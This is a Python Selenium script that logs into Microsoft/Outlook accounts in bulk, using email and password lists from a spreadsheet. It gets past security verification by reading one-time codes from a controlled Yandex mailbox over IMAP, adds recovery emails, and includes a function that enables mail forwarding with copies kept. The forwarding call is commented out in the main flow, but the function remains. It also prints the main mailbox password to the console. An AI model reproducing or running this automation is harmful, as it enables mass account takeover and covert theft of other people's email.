print("STARTING CODE")
import argparse
import time
import os

import pandas as pd
from datetime import datetime
from imap_tools import MailBox, AND
from requests_html import HTML
from get_numberPhone_and_code import get_code, get_phone
from read_mail_using_code import get_verify_code

from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common import TimeoutException
from selenium.webdriver.firefox.options import Options
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import wait

parser = argparse.ArgumentParser()

parser.add_argument('--data', type=str, default="forwarding_mail_data.xlsx")
args = parser.parse_args()

excel_data = pd.read_excel(args.data, "Data")

excel_data2 = pd.read_excel(args.data, "Mail_Main")
MAIN_EMAIL = excel_data2['main_email'][0]
MAIN_EMAIL_PASSWORD = excel_data2['main_password'][0]
NUM_WORKER = excel_data2['nums_worker'][0]
# PATH_FIREFOX = excel_data2['path_firefox'][0]

print(f"MAIN_EMAIL: {MAIN_EMAIL}")
print(f"MAIN_EMAIL_PASSWORD: {MAIN_EMAIL_PASSWORD}")
print(f"NUM_WORKER: {NUM_WORKER}")
# print(f"PATH_FIREFOX: {PATH_FIREFOX}")

pool = ThreadPoolExecutor(max_workers=NUM_WORKER)

options = Options()
options.set_preference('intl.accept_languages', 'en-GB')
# options.binary_location = r"{}".format(PATH_FIREFOX)
options.headless = True

data = pd.DataFrame(excel_data, columns=['email', 'password', 'email_protect'])

emails = []
for ind, row in data.iterrows():
    emails.append([row['email'], row['password'], row['email_protect']])


results = []


def login_with_account(email_text, password_text):
    browser = webdriver.Firefox(options=options)
    browser.get('https://login.live.com')
    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "i0116"))).send_keys(email_text)
    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idSIButton9"))).click()
    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "i0118"))).send_keys(password_text)
    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idSIButton9"))).click()
    return browser


def process_security_email(browser, email_protect_text):

    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idDiv_SAOTCS_Proofs"))).click()
    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idTxtBx_SAOTCS_ProofConfirmation"))).send_keys(email_protect_text)
    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idSubmit_SAOTCS_SendCode"))).click()
    for i in range(10):
        time.sleep(2)
        code = get_verify_code(mail=email_protect_text, seen=False)
        print("process_security_email:", code)
        if code is not None and code != -1:
            break


    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idTxtBx_SAOTCC_OTC"))).send_keys(code)
    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idSubmit_SAOTCC_Continue"))).click()
    try:
        WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "iCancel"))).click()
    except Exception as e:
        print(f"Exception: {e}")
    return browser


def add_mail_protect(browser, email_protect_text):
    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "EmailAddress"))).send_keys(email_protect_text)
    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "iNext"))).click()
    for i in range(10):
        time.sleep(2)
        code = get_verify_code(mail=email_protect_text, seen=False)
        print("add_mail_protect", code)
        if code is not None and code != -1:
            break

    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "iOttText"))).send_keys(code)
    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "iNext"))).click()
    return browser


def enter_email_forwarding(browser, email_protect_text):
    try:
        WebDriverWait(browser, 2).until(EC.element_to_be_clickable((By.ID, "iCancel"))).click()
    except Exception as e:
        pass

    try:
        WebDriverWait(browser, 1).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Cancel']"))).click()
    except Exception as e:
        pass

    try:
        print("Mail: ", email_protect_text)
        if "Unable to load these settings. Please try again later." in browser.page_source:
            print("Chua thue dc sdt")
            return browser, "Chua thue dc sdt"
        else:
            WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Enable forwarding']"))).click()
            WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Keep a copy of forwarded messages']"))).click()
            WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys(email_protect_text.split("@")[0])
            WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("@")
            WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("m")
            WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("i")
            WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("n")
            WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("h")
            WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys(".")
            WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("l")
            WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("i")
            WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("v")
            WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Enter an email address']"))).send_keys("e")

            WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Save']"))).click()

    except Exception as e:
        print("Mail: ", email_protect_text)
        print("Exception: ", e)
        return browser, "Error: web can't loaded"


    return browser, "Success"


def get_verify_code(mail: str, seen: bool):
    date = datetime.date(datetime.now())
    with MailBox('imap.yandex.com').login(MAIN_EMAIL, MAIN_EMAIL_PASSWORD) as mailbox:
        for msg in mailbox.fetch(criteria=AND(seen=seen, to=mail), reverse=True):
            page = HTML(html=str(msg.html))
            codes = page.xpath('//tr/td/span//text()')
            if len(codes):
                return codes[0]
            else:
                return -1


def process(account):
    print("-" * 100)
    print(account)

    email_text = account[0]
    password_text = account[1]
    email_protect_text = account[2]

    browser = login_with_account(email_text, password_text)
    time.sleep(2)
    if "Your account has been locked" in browser.page_source:
        status = "Truong hop 1"

    else:
        browser.get("https://outlook.live.com/mail/0/options/mail/layout")
        WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Sign in']"))).click()
        time.sleep(2)
        # WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.XPATH, "//*[text()='Forwarding']"))).click()
        # WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idDiv_SAOTCS_Proofs"))).click()
        # WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idTxtBx_SAOTCS_ProofConfirmation"))).send_keys(email_protect_text)
        # WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idSubmit_SAOTCS_SendCode"))).click()
        #
        # for i in range(10):
        #     time.sleep(2)
        #     code1 = get_verify_code(mail=email_protect_text, seen=False)
        #     print("get_verify_code: ", code1, email_text)
        #     if code1 is not None and code1 != -1:
        #         break
        # WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idTxtBx_SAOTCC_OTC"))).send_keys(code1)
        # WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.ID, "idSubmit_SAOTCC_Continue"))).click()
        # browser, status = enter_email_forwarding(browser, email_protect_text)
        status = "Truong hop 23"

    browser.close()
    results.append([email_text, password_text, email_protect_text, status])
    print("RESULTS: ", results)


if __name__ == '__main__':

    future = [pool.submit(process, mail) for mail in emails]
    wait(future)
    print("All task done.")
    results_df = pd.DataFrame(results, columns=["email", "password", "email_protect", "status"])
    results_df.to_excel(f"results_{time.time()}.xlsx")
